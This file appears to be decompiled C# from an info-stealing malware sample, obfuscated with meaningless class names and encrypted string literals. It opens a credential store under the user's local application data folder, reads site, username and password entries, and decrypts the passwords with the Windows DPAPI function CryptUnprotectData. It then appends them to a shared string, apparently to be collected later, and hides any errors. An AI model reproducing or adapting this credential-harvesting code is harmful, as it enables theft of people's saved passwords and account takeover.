using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal class Class7
{
	[Flags]
	public enum Enum0
	{
		flag_0 = 1,
		flag_1 = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct0
	{
		public int int_0;

		public Enum0 enum0_0;

		public IntPtr intptr_0;

		public string string_0;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct1
	{
		public int int_0;

		public IntPtr intptr_0;
	}

	public static string string_0;

	public static void smethod_0()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class6.smethod_0("jZPGzbedsbOhuKO7xMOshr+80HB1rcu/rHWxvb/FncCzqr+YtcV+lJLAuBg=", "False");
		checked
		{
			try
			{
				new Class8(text);
				Class8.smethod_5(Class6.smethod_0("l7W4wbieHA==", "False"));
				if (!File.Exists(text))
				{
					return;
				}
				int num = Class8.smethod_6() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = Class8.smethod_8(i, Class6.smethod_0("jautsqaMmLm9qSg=", "False"));
					string text3 = Class8.smethod_8(i, Class6.smethod_0("nre0yLaKsbS1voqwxLsh", "False"));
					string text4 = smethod_1(Encoding.Default.GetBytes(Class8.smethod_8(i, Class6.smethod_0("oa3K0cegvru9xpK4zMMZ", "False"))));
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string_0 = Class6.smethod_0("gZynrqCBnKeuoIGcrdnVs8zPrqCBnKeuoIGcp66ggZwE", "False") + "\r\n" + Class6.smethod_0("fL7N1Y1UEw==", "False") + text2 + "\r\n" + Class6.smethod_0("eLGuwrCEq66KYiM=", "False") + text3 + "\r\n" + Class6.smethod_0("eqbDysCZt7SRaRw=", "False") + text4 + "\r\n" + Class6.smethod_0("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZQg", "False") + "\r\n ";
						Class5.string_0 += string_0;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CryptUnprotectData(ref Struct1 struct1_0, string string_1, ref Struct1 struct1_1, IntPtr intptr_0, ref Struct0 struct0_0, int int_0, ref Struct1 struct1_2);

	public static string smethod_1(byte[] byte_0)
	{
		Struct1 struct1_ = default(Struct1);
		Struct1 struct1_2 = default(Struct1);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		struct1_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct1_.int_0 = byte_0.Length;
		gCHandle.Free();
		Struct1 @struct = default(Struct1);
		Struct1 struct1_3 = @struct;
		Struct0 struct2 = default(Struct0);
		Struct0 struct0_ = struct2;
		IntPtr intptr_ = default(IntPtr);
		CryptUnprotectData(ref struct1_, null, ref struct1_3, intptr_, ref struct0_, 0, ref struct1_2);
		checked
		{
			byte[] array = new byte[struct1_2.int_0 + 1];
			Marshal.Copy(struct1_2.intptr_0, array, 0, struct1_2.int_0);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}
}
